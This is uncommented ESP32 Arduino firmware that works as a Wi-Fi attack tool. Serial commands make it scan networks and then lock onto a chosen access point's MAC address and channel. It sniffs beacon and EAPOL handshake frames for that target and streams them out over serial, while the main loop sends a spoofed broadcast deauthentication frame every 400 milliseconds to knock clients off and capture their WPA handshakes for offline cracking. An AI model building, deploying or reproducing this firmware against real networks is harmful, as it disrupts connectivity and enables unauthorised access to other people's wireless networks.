#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"

#define BUFFER_SIZE 65536
uint8_t ring_buffer[BUFFER_SIZE];
volatile size_t head = 0;
volatile size_t tail = 0;

uint8_t target_mac[6];
int target_ch = 1;
bool is_capturing = false;

void bufferAppend(const uint8_t* data, size_t len) {
  size_t free_space = (tail > head) ? (tail - head - 1) : (BUFFER_SIZE - (head - tail) - 1);
  if (free_space < (len + 2)) return;

  ring_buffer[head] = len & 0xFF;
  head = (head + 1) % BUFFER_SIZE;
  ring_buffer[head] = (len >> 8) & 0xFF;
  head = (head + 1) % BUFFER_SIZE;

  for (size_t i = 0; i < len; i++) {
    ring_buffer[head] = data[i];
    head = (head + 1) % BUFFER_SIZE;
  }
}

void promiscuousRxCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!is_capturing) return;

  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t* payload = pkt->payload;
  uint16_t len = pkt->rx_ctrl.sig_len;

  if (len < 36 || len > 2000) return;

  uint8_t frame_type = payload[0];
  if (frame_type != 0x08 && frame_type != 0x88 && frame_type != 0x80) return;

  if (memcmp(&payload[4], target_mac, 6) != 0 && 
      memcmp(&payload[10], target_mac, 6) != 0 && 
      memcmp(&payload[16], target_mac, 6) != 0) return;

  if (frame_type == 0x80) {
    bufferAppend(payload, len);
  } else {
    uint16_t ethertype = (payload[32] << 8) | payload[33];
    if (ethertype == 0x0800 && len > 34) { 
      ethertype = (payload[34] << 8) | payload[35]; 
    }
    if (ethertype == 0x888E) {
      bufferAppend(payload, len);
    }
  }
}

void sendDeauth() {
  uint8_t deauth_packet[26] = {
    0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x01, 0x00
  };
  memcpy(&deauth_packet[10], target_mac, 6);
  memcpy(&deauth_packet[16], target_mac, 6);
  esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
}

void setup() {
  Serial.begin(921600);
  WiFi.mode(WIFI_AP_STA);
  esp_wifi_set_storage(WIFI_STORAGE_RAM);
  esp_wifi_start();
}

void loop() {
  if (is_capturing && head != tail) {
    size_t len = ring_buffer[tail];
    tail = (tail + 1) % BUFFER_SIZE;
    len |= (ring_buffer[tail] << 8);
    tail = (tail + 1) % BUFFER_SIZE;

    uint8_t temp_pkt[2048];
    if (len <= 2048) {
      for (size_t i = 0; i < len; i++) {
        temp_pkt[i] = ring_buffer[tail];
        tail = (tail + 1) % BUFFER_SIZE;
      }
      Serial.write((uint8_t*)&len, 2);
      Serial.write(temp_pkt, len);
    } else {
      tail = (tail + len) % BUFFER_SIZE;
    }
  }

  if (Serial.available()) {
    String cmd = Serial.readStringUntil('\n');
    cmd.trim();

    if (cmd == "SCAN") {
      is_capturing = false;
      esp_wifi_set_promiscuous(false);
      int n = WiFi.scanNetworks(false, true);
      for (int i = 0; i < n; ++i) {
        Serial.printf("NET:%d|%s|%d|%s\n", i, WiFi.SSID(i).c_str(), WiFi.channel(i), WiFi.BSSIDstr(i).c_str());
      }
      Serial.println("SCAN_DONE");
      WiFi.scanDelete();
    } 
    else if (cmd.startsWith("START:")) {
      int firstCol = cmd.indexOf(':', 6);
      target_ch = cmd.substring(6, firstCol).toInt();
      String macStr = cmd.substring(firstCol + 1);
      
      for (int i = 0; i < 6; i++) {
        target_mac[i] = (uint8_t)strtol(macStr.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
      }

      head = 0; tail = 0;
      is_capturing = true;
      
      esp_wifi_set_promiscuous(false);
      esp_wifi_set_channel(target_ch, WIFI_SECOND_CHAN_NONE);
      wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_CTRL_FILTER_MASK_ALL};
      esp_wifi_set_promiscuous_filter(&filter);
      esp_wifi_set_promiscuous_rx_cb(promiscuousRxCallback);
      esp_wifi_set_promiscuous(true);
      Serial.println("SNIFFER_READY");
    }
  }

  static unsigned long last_deauth = 0;
  if (is_capturing && millis() - last_deauth > 400) {
    sendDeauth();
    last_deauth = millis();
  }
}
